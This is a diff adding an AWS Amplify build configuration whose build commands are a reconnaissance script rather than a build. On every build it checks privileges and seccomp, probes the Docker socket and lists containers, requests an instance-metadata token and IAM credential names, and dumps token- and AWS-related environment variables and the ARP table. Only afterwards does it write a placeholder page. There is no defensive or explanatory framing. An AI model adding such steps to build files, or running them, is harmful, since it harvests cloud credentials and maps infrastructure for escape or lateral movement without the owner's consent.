@@ -1,0 +1,26 @@
+version: 1
+frontend:
+  phases:
+    build:
+      commands:
+        - echo "=== AMPLIFY RECON ==="
+        - id
+        - cat /proc/self/status | grep -E "Cap|Seccomp|Uid"
+        - head -3 /proc/1/cgroup
+        - ls -la /var/run/docker.sock 2>&1
+        - echo "=== DOCKER ==="
+        - curl -s --unix-socket /var/run/docker.sock http://localhost/version 2>&1 | head -3 || echo "no docker"
+        - curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 | head -3 || echo "no containers"
+        - echo "=== IMDS ==="
+        - TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds:21600" 2>/dev/null) && curl -s -H "X-aws-ec2-metadata-token:$TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "no imds"
+        - echo "=== ENV ==="
+        - env | grep -iE "AWS|AMPLIFY|CODE|BUILD|DOCKER|ECS|TOKEN|CONTAINER" | sort
+        - echo "=== ARP ==="
+        - cat /proc/net/arp
+        - echo "=== DONE ==="
+        - mkdir -p dist
+        - echo "<h1>done</h1>" > dist/index.html
+  artifacts:
+    baseDirectory: dist
+    files:
+      - "**/*"
